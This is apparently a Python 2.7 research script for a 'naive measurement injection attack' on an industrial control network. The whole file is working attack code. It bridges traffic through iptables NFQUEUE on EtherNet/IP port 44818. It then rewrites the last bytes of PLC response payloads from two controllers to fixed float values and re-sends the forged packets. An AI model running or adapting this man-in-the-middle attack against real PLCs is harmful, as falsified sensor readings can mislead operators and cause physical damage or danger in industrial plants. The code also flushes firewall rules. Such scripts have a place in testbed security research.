#! /usr/bin/env python2.7
##### Script to launch naive measurement injection attack #####
##### Takes one command line argument: PLC2/PLC3/BOTH #####

from netfilterqueue import NetfilterQueue
import os
import binascii
import struct
import sys
from datetime import datetime as dt
from scapy.all import *

print("Remember - bridge must already be started!")
os.system("modprobe br_netfilter")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -F")
os.system("iptables -F -t nat")
os.system("iptables -A FORWARD -p tcp --sport 44818 -j NFQUEUE --queue-num 1") # Response

def modify(packet):
    pkt = IP(packet.get_payload())
    
    if (sys.argv[1] == 'PLC3'):
        print('Hey PLC3')
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src == '10.0.0.3':
            if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                print("Seba")
                mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                # PLC2 measurments modified to a constant value, 1.5 in this case
                newdata = mydata[:-8]+'a4a1233f'
                print(newdata)
                pkt[Raw].load = newdata.decode('hex') 
                del pkt[IP].chksum
                del pkt[TCP].chksum
        packet.drop()
        send(pkt)
    elif (sys.argv[1] == 'PLC2'):
        print('Hey PLC2')
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818 and pkt[IP].src == '10.0.0.2':
            if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                print("Seba")
                mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                # PLC3 measurements modified to a constant value, 0.63918519 in this case
                newdata = mydata[:-8]+'0000c03f'
                print(newdata)
                pkt[Raw].load = newdata.decode('hex')
                del pkt[IP].chksum
                del pkt[TCP].chksum
        packet.drop()
        send(pkt)
    elif (sys.argv[1] == 'BOTH'):
        if pkt.haslayer(TCP) and pkt.getlayer(TCP).sport == 44818:
            if pkt[IP].src == '10.0.0.2':
                print('HEY2')
                if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                    mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                    newdata = mydata[:-8]+'0000c03f'
                    print(newdata)
                    pkt[Raw].load = newdata.decode('hex')
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                packet.drop()
                send(pkt)
            elif pkt[IP].src == '10.0.0.3':
                print('HEY3')
                if pkt.haslayer(Raw) and len(pkt.getlayer(Raw).load) == 50:
                    mydata = binascii.hexlify(bytes(pkt[Raw].load)).decode()
                    newdata = mydata[:-8]+'a4a1233f'
                    print(newdata)
                    pkt[Raw].load = newdata.decode('hex')
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                packet.drop()
                send(pkt)
    else:
        print('Invalid option!!')

nfqueue = NetfilterQueue()
nfqueue.bind(1, modify)
try:
    print "[*] waiting for data"
    print("START TIME:", str(dt.now()))
    nfqueue.run()
except KeyboardInterrupt:
    print("END TIME:", str(dt.now()))
    print("Flushing iptables.")
    # This flushes everything, you might wanna be careful
    os.system('iptables -F')
    os.system('iptables -X')
    pass
